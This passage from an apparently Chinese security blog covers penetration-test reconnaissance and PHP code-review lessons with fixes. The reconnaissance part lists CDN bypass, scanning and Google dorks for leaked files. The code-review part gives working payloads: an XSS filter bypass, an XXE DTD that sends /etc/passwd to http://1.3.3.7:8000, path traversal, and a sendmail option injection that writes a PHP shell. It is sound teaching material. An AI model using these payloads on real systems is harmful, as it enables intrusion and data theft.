href=\"http://ipwhois.cnnic.net.cn/\" target=\"_blank\" rel=\"noopener\">http://ipwhois.cnnic.net.cn/</a> 使用网信中心可以通过IP查到CNNIC及中国大陆的IP地址分配信息，可以确认公司的IP段，并且可以通过公司信息反查IP。</p>\n<h4 id=\"利用国外冷门DNS或子域名\"><a href=\"#利用国外冷门DNS或子域名\" class=\"headerlink\" title=\"利用国外冷门DNS或子域名\"></a>利用国外冷门DNS或子域名</h4><p>很多网站为了节省资源使用并不会给国外的冷门DNS或者一些多级子域名做CDN，所以在这两方面可能可以直接获取真实IP。</p>\n<p>大部分国内网站的CDN都是对内使用的，如果使用国外冷门DNS服务器解析可能可以直接解析到真实IP,下附命令及国外一些DNS服务器:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nslookup http://foo.com 8.8.8.8</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\">Google Public DNS：8.8.8.8、8.8.4.4</span><br><span class=\"line\"></span><br><span class=\"line\">Norton DNS：198.153.192.1、198.153.194.1</span><br><span class=\"line\"></span><br><span class=\"line\">OpenDNS：208.67.222.222、208.67.220.220</span><br><span class=\"line\"></span><br><span class=\"line\">OpenDNS Family：208.67.222.123、208.67.220.123</span><br><span class=\"line\"></span><br><span class=\"line\">Comodo Secure DNS：156.154.70.22、156.156.71.22</span><br><span class=\"line\"></span><br><span class=\"line\">ScrubIt DNS：67.138.54.100、207.225.209.66</span><br><span class=\"line\"></span><br><span class=\"line\">DNS Advantage：156.154.70.1、156.154.71.1</span><br><span class=\"line\">*/</span><br></pre></td></tr></table></figure>\n<h4 id=\"RSS订阅、邮件订阅等\"><a href=\"#RSS订阅、邮件订阅等\" class=\"headerlink\" title=\"RSS订阅、邮件订阅等\"></a>RSS订阅、邮件订阅等</h4><p>很多网站提供了RSS或者邮件订阅等服务，服务器向我们发送RSS或者邮件的时候就可以获取到真实的IP，或者同一网段的IP。</p>\n<h4 id=\"利用网络空间搜索器\"><a href=\"#利用网络空间搜索器\" class=\"headerlink\" title=\"利用网络空间搜索器\"></a>利用网络空间搜索器</h4><p><a href=\"https://fofa.so/\" target=\"_blank\" rel=\"noopener\">https://fofa.so/</a> fofa比zoomeye和shodan好的地方就是可以搜索title语法，利用网站title信息来进行查询，成功率很高。</p>\n<h4 id=\"域名解析历史记录查询\"><a href=\"#域名解析历史记录查询\" class=\"headerlink\" title=\"域名解析历史记录查询\"></a>域名解析历史记录查询</h4><p><a href=\"https://www.virustotal.com/#/domain/foo.com\" target=\"_blank\" rel=\"noopener\">https://www.virustotal.com/#/domain/foo.com</a></p>\n<p><a href=\"https://toolbar.netcraft.com/site_report?url=foo.com\" target=\"_blank\" rel=\"noopener\">https://toolbar.netcraft.com/site_report?url=foo.com</a></p>\n<p><a href=\"https://x.threatbook.cn/\" target=\"_blank\" rel=\"noopener\">https://x.threatbook.cn/</a> 微步也可以查到但是部分需要付费</p>\n<p>有些网站在使用CDN之前的IP解析也会被历史解析记录到可以试试。</p>\n<h4 id=\"网站自身漏洞泄露\"><a href=\"#网站自身漏洞泄露\" class=\"headerlink\" title=\"网站自身漏洞泄露\"></a>网站自身漏洞泄露</h4><p>像探针页面、phpinfo页面、或者利用诸如ssrf等漏洞远程访问自己的服务器。</p>\n<h3 id=\"C段扫描\"><a href=\"#C段扫描\" class=\"headerlink\" title=\"C段扫描\"></a>C段扫描</h3><p>C段扫描即因为通常情况下机房给予企业的外网IP都是在同一C段下连续的IP，所以可以对IP进行C段扫描看看是否有该目标的其他可突破IP。</p>\n<p>可以利用各种搜索引擎（IP为举例）：<br>google的<code>site:192.168.1.*</code><br>shodan的<code>net:192.168.1.0/24</code><br>zoomeyed的<code>cidr:192.168.1.0/24</code></p>\n<p>也可以利用一些在线服务：<br><a href=\"https://www.5kik.com/c/\" target=\"_blank\" rel=\"noopener\">https://www.5kik.com/c/</a><br><a href=\"http://www.webscan.cc/\" target=\"_blank\" rel=\"noopener\">http://www.webscan.cc/</a></p>\n<p>或者一些工具：<br><a href=\"http://www.91ri.org/7915.html\" target=\"_blank\" rel=\"noopener\">http://www.91ri.org/7915.html</a><br><a href=\"http://www.7kb.org/817.html\" target=\"_blank\" rel=\"noopener\">http://www.7kb.org/817.html</a></p>\n<p>利用Nmap的（比较耗时且使用的是ping方式）<br><code>namp -sP ip/24 -oN c:\\ip.txt</code><br>扫描网站服务器c段，并且生成报告</p>\n<p>还有很多别的方式这里只是简单举例</p>\n<h3 id=\"获得IP之后的端口扫描\"><a href=\"#获得IP之后的端口扫描\" class=\"headerlink\" title=\"获得IP之后的端口扫描\"></a>获得IP之后的端口扫描</h3><p>中小型企业直接用神器nmap扫描就好，这里主要介绍一下对大型企业大量IP的端口扫描方案：<br>masscan+nmap，利用masscan号称6分钟扫遍全网端口的效率来简单扫描开放的端口，然后利用nmap再进行识别端口的详细扫描。<br>相应的命令为<code>masscan XX.XXX.XX.XXX -p1-65535 --rate 1000</code>和<code>-sV -Pn --version-all -v -T4</code>其中-sV是端口识别；-Pn是跳过发现IP端口的过程，因为这个过程在之前由masscan完成了；–version-all是提高端口识别的准确度，保证对每个端口尝试每个探测报文；-v是使用细节模式提高详细度，可以输出扫描过程的更多信息；-T4，如果用于有足够的带宽或以太网连接，建议使用-T4选项，相对默认扫描能更快。<br>接下来就是对端口扫描出来的结果分析利用了。</p>\n<h2 id=\"域名相关\"><a href=\"#域名相关\" class=\"headerlink\" title=\"域名相关\"></a>域名相关</h2><h3 id=\"whois\"><a href=\"#whois\" class=\"headerlink\" title=\"whois\"></a>whois</h3><p><a href=\"https://whois.icann.org/en\" target=\"_blank\" rel=\"noopener\">https://whois.icann.org/en</a> </p>\n<p><a href=\"https://www.whois.net/\" target=\"_blank\" rel=\"noopener\">https://www.whois.net/</a> whois.net</p>\n<p><a href=\"https://x.threatbook.cn/\" target=\"_blank\" rel=\"noopener\">https://x.threatbook.cn/</a> 微步威胁情报查询</p>\n<p><a href=\"http://whois.chinaz.com/\" target=\"_blank\" rel=\"noopener\">http://whois.chinaz.com/</a> 站长之家</p>\n<p>可查询到注册人姓名、邮箱、注册地、电话、DNS服务器、注册公司信息等</p>\n<p>利用姿势：</p>\n<ol>\n<li>对注册人姓名、邮箱、电话进行反查旁站及域名和IP的历史信息</li>\n<li>对注册信息进行社工</li>\n<li>针对以上信息制作弱口令 <a href=\"https://www.w0ai1uo.org/mima/\" target=\"_blank\" rel=\"noopener\">猜密码</a>用于猜解密码</li>\n</ol>\n<h3 id=\"网站备案号\"><a href=\"#网站备案号\" class=\"headerlink\" title=\"网站备案号\"></a>网站备案号</h3><p><a href=\"http://icp.chinaz.com/\" target=\"_blank\" rel=\"noopener\">http://icp.chinaz.com/</a> 站长之家</p>\n<p><a href=\"http://www.miibeian.gov.cn/publish/query/indexFirst.action\" target=\"_blank\" rel=\"noopener\">http://www.miibeian.gov.cn/publish/query/indexFirst.action</a> 工信部备案查询</p>\n<p>利用姿势：大中型企业的网络资产中，肯定远不止一个主域名，利用备案反查可以发现同一备案号下很多隐藏的域名。</p>\n<h3 id=\"SSL证书查询\"><a href=\"#SSL证书查询\" class=\"headerlink\" title=\"SSL证书查询\"></a>SSL证书查询</h3><p><a href=\"https://censys.io/\" target=\"_blank\" rel=\"noopener\">https://censys.io/</a> </p>\n<p><a href=\"https://crt.sh/\" target=\"_blank\" rel=\"noopener\">https://crt.sh/</a></p>\n<p><a href=\"https://myssl.com/\" target=\"_blank\" rel=\"noopener\">https://myssl.com/</a></p>\n<p><a href=\"https://www.chinassl.net/ssltools/ssl-checker.html\" target=\"_blank\" rel=\"noopener\">https://www.chinassl.net/ssltools/ssl-checker.html</a></p>\n<p>利用姿势：一样是利用反查来查询隐藏的主域名。</p>\n<h3 id=\"子域名、目录挖掘\"><a href=\"#子域名、目录挖掘\" class=\"headerlink\" title=\"子域名、目录挖掘\"></a>子域名、目录挖掘</h3><p><a href=\"https://pentester.land/cheatsheets/2018/11/14/subdomains-enumeration-cheatsheet.html\" target=\"_blank\" rel=\"noopener\">子域名枚举备忘录</a></p>\n<h4 id=\"爬虫式扫描\"><a href=\"#爬虫式扫描\" class=\"headerlink\" title=\"爬虫式扫描\"></a>爬虫式扫描</h4><p>使用爬虫逐级遍历目录例如awvs的目录扫描以及burp的spider等工具</p>\n<h4 id=\"字典扫描\"><a href=\"#字典扫描\" class=\"headerlink\" title=\"字典扫描\"></a>字典扫描</h4><p>字典扫描的重点还是在于字典</p>\n<p>目录扫描工具：<br><a href=\"https://github.com/Strikersb/webdirscan\" target=\"_blank\" rel=\"noopener\">https://github.com/Strikersb/webdirscan</a>  王松写的目录扫描器<br>御剑</p>\n<p>子域名扫描工具<br><a href=\"https://github.com/lijiejie/subDomainsBrute\" target=\"_blank\" rel=\"noopener\">https://github.com/lijiejie/subDomainsBrute</a> 高并发的DNS暴力枚举 优势在于速度快<br><a href=\"https://www.waitalone.cn/seay-layer-42.html\" target=\"_blank\" rel=\"noopener\">https://www.waitalone.cn/seay-layer-42.html</a> Layer子域名挖掘机 优势在于可以探测端口、服务器信息、服务器状态<br><a href=\"https://phpinfo.me/domain/\" target=\"_blank\" rel=\"noopener\">https://phpinfo.me/domain/</a> 某大佬的在线子域名爆破|Domain fuzz</p>\n<h4 id=\"利用搜索引擎：\"><a href=\"#利用搜索引擎：\" class=\"headerlink\" title=\"利用搜索引擎：\"></a>利用搜索引擎：</h4><p>常用google、bing，扫子域名的常用语法 <code>site:</code>，其中bing提供了API，很多子域名扫描机也是基于bing的API实现的，详情请见：<a href=\"https://azure.microsoft.com/en-us/services/cognitive-services/bing-web-search-api/\" target=\"_blank\" rel=\"noopener\">bing-web-search-api</a></p>\n<h3 id=\"旁站查询\"><a href=\"#旁站查询\" class=\"headerlink\" title=\"旁站查询\"></a>旁站查询</h3><p>旁站即同一IP下服务器搭载的不同web应用，一般的旁站查询工具都是使用bing的API，其实直接用google，bing使用<code>ip:</code>语法查询也可，这里分享几个在线查询站。<br><a href=\"http://www.webscan.cc/\" target=\"_blank\" rel=\"noopener\">http://www.webscan.cc/</a><br><a href=\"http://s.tool.chinaz.com/same\" target=\"_blank\" rel=\"noopener\">http://s.tool.chinaz.com/same</a></p>\n<h3 id=\"WEB应用及容器识别\"><a href=\"#WEB应用及容器识别\" class=\"headerlink\" title=\"WEB应用及容器识别\"></a>WEB应用及容器识别</h3><p>非常第一网站是修改过的wordpress可以使用wpscan或者尝试/wp-admin /wp-content /readme.html等目录</p>\n<p>一般是从HTTP头部、Banner、网站目录、使用的js文件等暴露出来的信息来进行识别</p>\n<p><a href=\"https://builtwith.com/\" target=\"_blank\" rel=\"noopener\">https://builtwith.com/</a> 找出网站是用什么创建的</p>\n<p><a href=\"http://www.yunsee.cn/\" target=\"_blank\" rel=\"noopener\">http://www.yunsee.cn/</a> 云悉 适合国内各种CMS识别</p>\n<p><a href=\"https://www.wappalyzer.com/\" target=\"_blank\" rel=\"noopener\">https://www.wappalyzer.com/</a> 有浏览器插件版本</p>\n<p><a href=\"https://www.zoomeye.org/\" target=\"_blank\" rel=\"noopener\">https://www.zoomeye.org/</a> 钟馗之眼偏向WEB应用</p>\n<p><a href=\"https://www.shodan.io/\" target=\"_blank\" rel=\"noopener\">https://www.shodan.io/</a> 撒旦之眼偏向网络设备（路由、摄像头等）和服务器</p>\n<p>这两个搜索引擎在针对性渗透测试中常用的语法<br><code>site:</code>,<code>hostname:</code>,<code>CIDR:</code>（指定网段）,<code>port:</code>,<code>keyword:</code>,<code>ip:</code></p>\n<p>然后可以搜索cve、expdb、乌云镜像等之类的vuldb网站来查询是否有历史遗留的版本漏洞</p>\n<h2 id=\"敏感信息泄露\"><a href=\"#敏感信息泄露\" class=\"headerlink\" title=\"敏感信息泄露\"></a>敏感信息泄露</h2><p>现在越来越多安全问题突破口是通过“人”的方式了，敏感信息泄露就是其中很大的一部分，最近很热门的就是华住的程序员把SQL带明文密码的config文件暴露在github导致了几亿数据的泄露。还有的敏感目录扫描会暴露管理后台、使用的CMS或editor等信息，从而找到exp进行突破。</p>\n<h3 id=\"google-hacking\"><a href=\"#google-hacking\" class=\"headerlink\" title=\"google hacking\"></a>google hacking</h3><p>google在安全方面的利用方式已经自成一派,详情可见：<br><a href=\"https://www.exploit-db.com/google-hacking-database/\" target=\"_blank\" rel=\"noopener\">https://www.exploit-db.com/google-hacking-database/</a></p>\n<p>这里只说一下有关敏感信息的常见姿势</p>\n<p>敏感文件（.mdb,.excel,.word,.zip,.rar）,查看是否存在源代码泄露。常见有.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF/web.xml泄露。</p>\n<pre><code>#举例几个常见的语法\n\n#git文件泄露\ninurl:&quot;/.git/head&quot;        # https://github.com/lijiejie/GitHack git泄露的利用\n#敏感文件泄露\nfiletype:sql intitle:&quot;index of&quot;\nfiletype:mdb intitle:&quot;index of&quot;\nintitle:&quot;index of&quot; etc\ninurl:service.pwd\nsite:xxx.com filetype:xls,conf intext:pass\n#管理后台\nsite:xxx.com 管理/后台/admin/login\n</code></pre><p>googlehack也是一个可以很灵活运用的方式，比如当你收集到网站应用目录或者参数的大致命名规律或者指纹信息，就可以用googlehack利用起来试试。</p>\n<p>另外推荐一个<a href=\"https://github.com/laramies/theHarvester\" target=\"_blank\" rel=\"noopener\">https://github.com/laramies/theHarvester</a> 利用搜索引擎社工神器</p>\n<h3 id=\"JS文件敏感信息泄露\"><a href=\"#JS文件敏感信息泄露\" class=\"headerlink\" title=\"JS文件敏感信息泄露\"></a>JS文件敏感信息泄露</h3><p>参考：<a href=\"http://wooyun.jozxing.cc/static/drops/web-6710.html\" target=\"_blank\" rel=\"noopener\">http://wooyun.jozxing.cc/static/drops/web-6710.html</a><br>大致分为三类：</p>\n<ol>\n<li>泄露后台管理敏感路径或API（参数）</li>\n<li>泄露http-only保护的cookie</li>\n<li>泄露用户敏感信息</li>\n</ol>\n<h3 id=\"github信息泄露\"><a href=\"#github信息泄露\" class=\"headerlink\" title=\"github信息泄露\"></a>github信息泄露</h3><p>一个github敏感信息挖掘机供参考：<br><a href=\"https://github.com/UnkL4b/GitMiner\" target=\"_blank\" rel=\"noopener\">https://github.com/UnkL4b/GitMiner</a>  GitMiner</p>\n<p>github敏感信息的搜寻方式大致思路就是利用域名，员工，IP等方式搜索相关源码或配置文件。</p>\n"},{"layout":"““","title":"php code review","date":"2018-08-06T09:28:57.000Z","_content":"# PHP代码审计学习 #\n\n----------\n\n项目来源：https://www.ripstech.com/php-security-calendar-2017/\n\n## in_array()函数误用 ##\n\n### 分析 ###\n\n```php\nclass Challenge {\n    const UPLOAD_DIRECTORY = './solutions/';\n    private $file;\n    private $whitelist;\n\n    public function __construct($file) {\n        $this->file = $file;\n        $this->whitelist = range(1, 24);\n    }\n\n    public function __destruct() {\n        if (in_array($this->file['name'], $this->whitelist)) {\n            move_uploaded_file(\n                $this->file['tmp_name'],\n                self::UPLOAD_DIRECTORY . $this->file['name']\n            );\n        }\n    }\n}\n\n$challenge = new Challenge($_FILES['solution']);\n```\n\n出现问题的源代码如上，使用`in_array()`函数检查匹配`file['name']`是否在`whitelist`中，但忽略了`in_array()`函数中未设置强匹配参数，导致了弱类型问题。\n\nphpmanual中对in_array的参数解释如下\n\n```\nbool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )\n\n//大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。\n\n//strict\n如果第三个参数 strict 的值为 TRUE 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同。\n```\n\n### 利用 ###\n\n其实就是php弱类型的利用，程序员编写时由于不严谨认为输入一定会是int整型数据，我们输入str字符型数据然后利用php的弱类型特点即可。\n\n弱类型的规律举例如下\n```\n<?php\n\n$array = array(\n    'egg' => true,\n    'cheese' => false,\n    'hair' => 765,\n    'goblins' => null,\n    'ogres' => 'no ogres allowed in this array'\n);\n\n// Loose checking -- return values are in comments\n\n// First three make sense, last four do not\n\nvar_dump(in_array(null, $array)); // true\nvar_dump(in_array(false, $array)); // true\nvar_dump(in_array(765, $array)); // true\nvar_dump(in_array(763, $array)); // true\nvar_dump(in_array('egg', $array)); // true\nvar_dump(in_array('hhh', $array)); // true\nvar_dump(in_array(array(), $array)); // true\n\n// Strict checking\nvar_dump(in_array(null, $array, true)); // true\nvar_dump(in_array(false, $array, true)); // true\nvar_dump(in_array(765, $array, true)); // true\nvar_dump(in_array(763, $array, true)); // false\nvar_dump(in_array('egg', $array, true)); // false\nvar_dump(in_array('hhh', $array, true)); // false\nvar_dump(in_array(array(), $array, true)); // false\n\n?>\n```\n\n### 修复 ###\n\n使用`===`强匹配或`in_array()`函数加上第三个参数`$strict=ture`\n\n----------\n\n## 一个XSS过滤绕过trick ##\n\n### 分析 ###\n```php\n// composer require \"twig/twig\"\nrequire 'vendor/autoload.php';\n\nclass Template {\n    private $twig;\n\n    public function __construct() {\n        $indexTemplate = '<img ' .\n            'src=\"https://loremflickr.com/320/240\">' .\n            '<a href=\"{{link|escape}}\">Next slide »</a>';\n\n        // Default twig setup, simulate loading\n        // index.html file from disk\n        $loader = new Twig\\Loader\\ArrayLoader([\n            'index.html' => $indexTemplate\n        ]);\n        $this->twig = new Twig\\Environment($loader);\n    }\n\n    public function getNexSlideUrl() {\n        $nextSlide = $_GET['nextSlide'];\n        return filter_var($nextSlide, FILTER_VALIDATE_URL);\n    }\n\n    public function render() {\n        echo $this->twig->render(\n            'index.html',\n            ['link' => $this->getNexSlideUrl()]\n        );\n    }\n}\n\n(new Template())->render();\n```\n以php的一个模版引擎twig为例，对url进行XSS安全过滤，其中`escape`和`FILTER_VALIDATE_URL`进行了两次过滤转换。\n\n第一次在第10行，`escape`过滤，使用的是php自带的`htmlspecialchars`函数\n\n\n> htmlspecialchars\n> (PHP 4, PHP 5, PHP 7)\n> htmlspecialchars — 将特殊字符转换为 HTML 实体\n> \n> ```& (& 符号)  ===============  &amp;\n\" (双引号)  ===============  &quot;\n' (单引号)  ===============  &apos;\n< (小于号)  ===============  &lt;\n> (大于号)  ===============  &gt;```\n\n第二次过滤在22行，使用filter_var函数用`FILTER_VALIDATE_URL`过滤器对`$nextSlide`变量进行过滤。检查是否是合法的url。\n\n### 利用 ###\n可以看到代码对XSS常用的\"'<>符号进行了过滤，但我们可以利用`%0a`换行符的trick来逃逸过滤，可以通过以下payload执行，首先引入`javascript:`协议，然后利用javascript中`//`代表单行注释，而`%250a`经过一次urldecode变成`%0a`换行符，成功逃逸出注释行，从而进入`echo`函数中形成XSS。\n` ?nextSlide=javascript://comment%250aalert(1)`\n\n**稍微总结一下常规bypass思路，试敏感关键函数和敏感符号→试编码或注释符号等混淆方法→试伪协议。**\n\n### 修复 ###\n针对XSS敏感关键词进行黑名单过滤\n\n----------\n\n## class_exists函数和实例化可控导致的XXE漏洞 ##\n### 分析 ###\n代码如下\n```php\nfunction __autoload($className) {\n    include $className;\n}\n\n$controllerName = $_GET['c'];\n$data = $_GET['d'];\n\nif (class_exists($controllerName)) {\n    $controller = new $controllerName($data['t'], $data['v']);\n    $controller->render();\n} else {\n    echo 'There is no page with this name';\n}\n\nclass HomeController {\n    private $template;\n    private $variables;\n\n    public function __construct($template, $variables) {\n        $this->template = $template;\n        $this->variables = $variables;\n    }\n\n    public function render() {\n        if ($this->variables['new']) {\n            echo 'controller rendering new response';\n        } else {\n            echo 'controller rendering old response';\n        }\n    }\n}\n```\n这段代码中有两个安全漏洞。第8行中调用class_exists（）会触发文件包含漏洞。\nPHP文档中对于`class_exist`函数的解释如下\n>**class_exists** \n> \n> (PHP 4, PHP 5, PHP 7)\n> \n> class_exists — 检查类是否已定义\n> \n> 说明 \n> \n> bool class_exists ( string $class_name [, bool $autoload = true ] )检查指定的类是否已定义。\n> \n> 参数 \n> \n> class_name\n> \n> 类名。名字的匹配是不分区大小写的。\n> \n> autoload\n> \n> 是否默认调用 __autoload。\n\n\n可知`class_exist`函数默认调用`__autoload`函数，其中调用了`include`函数，会造成文件包含漏洞。可以使用路径穿越来包含任意文件，但是使用像这样的`../../../../etc/passwd`路径穿越符号的前提是PHP版本在5~5.3(包含5.3)版本之间才可以。\n但是第二个漏洞仍然适用于当前的PHP版本。在以下几行:\n```php\n$controllerName = $_GET['c']; //这里$controllerName可控\n$data = $_GET['d'];           //这里$data可控  \n\nif (class_exists($controllerName)) {\n    $controller = new $controllerName($data['t'], $data['v']);\n//这里使用可控的变量实例化了一个对象，而对象的名称及内容均可控。\n```\n这样的话，恶意的payload便可以控制实例化过程，任意构造函数，即使代码库本身没有易受攻击的函数。也可以使用PHP内置的SimpleXMLElement函数来进行XXE攻击，进行文件读取操作等行为。\n### 利用 ###\n 1.文件包含漏洞\n 令`class_exist`函数传入形如`../../../../etc/passwd`的payload即可；\n\n 2.实例化SimpleXMLElement进行XXE攻击，查看php手册，SimpleXMLElement构造函数说明如下：\n> **SimpleXMLElement::__construct**\n> \n> (PHP 5, PHP 7)\n> \n> SimpleXMLElement::__construct — Creates a new SimpleXMLElement object\n> \n> **说明** \n> final public SimpleXMLElement::__construct ( string $data [, int $options = 0 [, bool $data_is_url = FALSE [, string $ns = \"\" [, bool $is_prefix = FALSE ]]]] )\n> \n> 创建一个新的SimpleXMLElement对象。\n> \n> 参数 \n> \n> data\n> \n> 格式良好的XML字符串或XML文档的路径或URL（如果 data_is_url是）TRUE。\n> \n> options\n可选地用于指定其他Libxml参数。\n> \n> 注意：\n> 可能需要传递LIBXML_PARSEHUGE 以能够处理深度嵌套的XML或非常大的文本节点。\n> \n> data_is_url\n> \n> 默认情况下data_is_url是FALSE。使用TRUE指定data的路径或URL到一个XML文件，而不是字符串数据。\n> \n> ns\n> 命名空间前缀或URI。\n> is_prefix\n> TRUE如果ns是前缀，FALSE如果是URI; 默认为FALSE。\n\n 所以构造形如`{\"SimpleXMLElement\":{\"data\":\"http://localhost/xxe.xml\",\"options\":2,\"data_is_url\":1,\"ns\":\"\",\"is_prefix\":0}}`其中SimpleXMLElement为实例化函数名，后续payload为SimpleXMLElement构造函数的内容，xxe.xml为XML实体文件。XML实体文件写法可以参考[XXE漏洞分析 from 404 Not Found](http://www.4o4notfound.org/index.php/archives/29/#pingback-28)这里就不多做探讨。\n\n 举一个例子:\n```xxe.xml\n<?xml version=\"1.0\" ?>\n<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY % sp SYSTEM \"http://1.3.3.7:8000/xxe.dtd\">\n%sp;\n%param1;\n]>\n<r>&exfil;</r>\n```\n\n```xml.dtd\n<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">      //这里使用base64编码是起读取文件时不丢失一些特殊符号的作用\n<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://1.3.3.7:8000/?%data;'>\">\n```\n\n### 修复 ###\n 1.将`class_exist`函数中的`bool $autoload`参数设为false，即不自动调用`__autoload`函数；或者`__autoload函数`中不要使用`include`函数；或升级PHP版本避免路径遍历符号的传递。\n \n 2.PHP中防御XXE攻击方法：设置`libxml_disable_entity_loader(true);`；当然最大的问题还是不应该让实例化对象变成用户输入可控。\n\n----------\n\n## strpo()函数误用 ##\n源码如下：\n```php\nclass Login {\n    public function __construct($user, $pass) {\n        $this->loginViaXml($user, $pass);\n    }\n\n    public function loginViaXml($user, $pass) {\n        if (\n            (!strpos($user, '<') || !strpos($user, '>')) &&\n            (!strpos($pass, '<') || !strpos($pass, '>'))\n        ) {\n            $format = '<?xml version=\"1.0\"?>' .\n                      '<user v=\"%s\"/><pass v=\"%s\"/>';\n            $xml = sprintf($format, $user, $pass);\n            $xmlElement = new SimpleXMLElement($xml);\n            // Perform the actual login.\n            $this->login($xmlElement);\n        }\n    }\n}\n\nnew Login($_POST['username'], $_POST['password']);\n```\n### 分析 ###\n可以看到此段代码的第8，9行使用`strpo()`函数检查payload中是否有`<``>`符号，以检查XML利用的敏感符号。检查后传入第11、12行的`$format`变量中，然后格式化生成XML。\n`strpos()`函数文档如下：\n> **strpos**\n> \n> (PHP 4, PHP 5, PHP 7)\n> \n> strpos — 查找字符串首次出现的位置\n> \n> **说明** \n> int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )\n> 返回 needle 在 haystack 中首次出现的数字位置。\n> \n> **参数**\n> haystack\n> 在该字符串中进行查找。\n> \n> needle\n> 如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符的顺序值。\n> \n> offset\n> 如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。 如果是负数，搜索会从字符串结尾指定字符数开始。\n> \n> **返回值** \n> 返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。\n> \n> 如果没找到 needle，将返回 FALSE。\n> \n> **Warning**\n> 此函数可能返回布尔值 FALSE，但也可能返回等同于 FALSE 的非布尔值。请阅读 布尔类型章节以获取更多信息。应使用 === 运算符来测试此函数的返回值。\n \n这里**Warning**中已经提示了`strpos()`可能返回等同于FALSE的非布尔值，即在首位查询到了条件并返回了值为`0`，又因为PHP的弱类型特性，若没有使用`===`的强匹配，`0`就会等于`false`。\n\n### 利用 ###\n 前文已分析到令查询位置为首位即可，故payload可以为`user=<\"><injected-tag%20property=\"&pass=<injected-tag>`\n \n 其中首位的`<`可以令`strpo()`函数返回`0`即`FALSE`，从而绕过检查，`\">`是为了闭合之前的内容，然后就可以利用XML进行各种XXE攻击的利用\n\n### 修复 ###\n使用`===`强匹配\n\n----------\n\n## mali()函数的危险性 ##\n\n源代码：\n```php\nclass Mailer {\n    private function sanitize($email) {\n        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {\n            return '';\n        }\n\n        return escapeshellarg($email);\n    }\n\n    public function send($data) {\n        if (!isset($data['to'])) {\n            $data['to'] = 'none@ripstech.com';\n        } else {\n            $data['to'] = $this->sanitize($data['to']);\n        }\n\n        if (!isset($data['from'])) {\n            $data['from'] = 'none@ripstech.com';\n        } else {\n            $data['from'] = $this->sanitize($data['from']);\n        }\n\n        if (!isset($data['subject'])) {\n            $data['subject'] = 'No Subject';\n        }\n\n        if (!isset($data['message'])) {\n            $data['message'] = '';\n        }\n\n        mail($data['to'], $data['subject'], $data['message'],\n             '', \"-f\" . $data['from']);\n    }\n}\n\n$mailer = new Mailer();\n$mailer->send($_POST);\n```\n### 分析 ###\n此漏洞主要是由于`mail()`函数的第五个参数，先看一下`mail()`函数的用法：\n> **mail**\n> \n> (PHP 4, PHP 5, PHP 7)\n> \n> mail — 发送邮件\n> \n> **说明**\n> \n> bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] )\n> 发送一封电子邮件。\n> \n> **参数**\n> \n> **to**\n> 收件人\n> **subject**\n> 主题\n> **message**\n> 邮件内容\n> **additional_headers**\n> 添加邮件的额外头部，如`CC:`Carbon Copy(抄送)、`BCC:`Blind CarbonCopy(秘密抄送)\n> **additional_parameters**\n> 传递给发送程序sendmail的额外参数。例如，当使用带有-f sendmail选项的sendmail时，可以使用此选项设置邮件发件人地址 。\n\n在Linux系统上， php 的 mail 函数在底层中已经写好了，默认调用 Linux 的 **sendmail** 程序发送邮件。而在额外参数( additional_parameters )中， sendmail 主要支持的选项有以下三种：\n> -O option = value\n> \n> QueueDirectory = queuedir 选择队列消息\n> \n> -X logfile\n> \n> 这个参数可以指定一个目录来记录发送邮件时的详细日志情况。\n> \n> -f from email\n> \n> 这个参数可以让我们指定我们发送邮件的邮箱地址。\n\n 在PHP中使用`mail()`函数的话需要在`php.ini`中配置以下两个选项中的一种：\n 1.配置好SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议的服务器hostname和port来告诉PHP使用那个代理。\n 2.配置好一个邮件程序的文件地址，使其作为MTA(Mail Transfer Agent)即邮件传输代理。\n \n 当PHP是用第2种方式配置的时候，`mail()`将传递给MTA程序运行，虽然PHP默认提供了`escapeshellcmd()`这个函数在这些`&#;|*?~<>^()[]{}$\\, \\x0A 和 \\xFF`字符前插入`\\`进行转义以防止代码注入的安全性问题，但是`mail()`函数的第5个参数`$additional_parameters`允许用户添加新参数的特性使得可以被攻击者利用。\n```php\nmail(\"myfriend@example.com\", \"subject\", \"message\", \"\", \"-f\" . $_GET['from']); //程序代码举例\n\nexample@example.com -O QueueDirectory=/tmp -X /var/www/html/rce.php //payload举例 -O 可以用来重新配置sendmail选项 -X可以指定日志文件位置\n```\n\n 之前PHPMailer漏洞CVE-2016-10033就是这样发现的，影响到了包括像Wordpress这样广泛使用的程序。\n\n 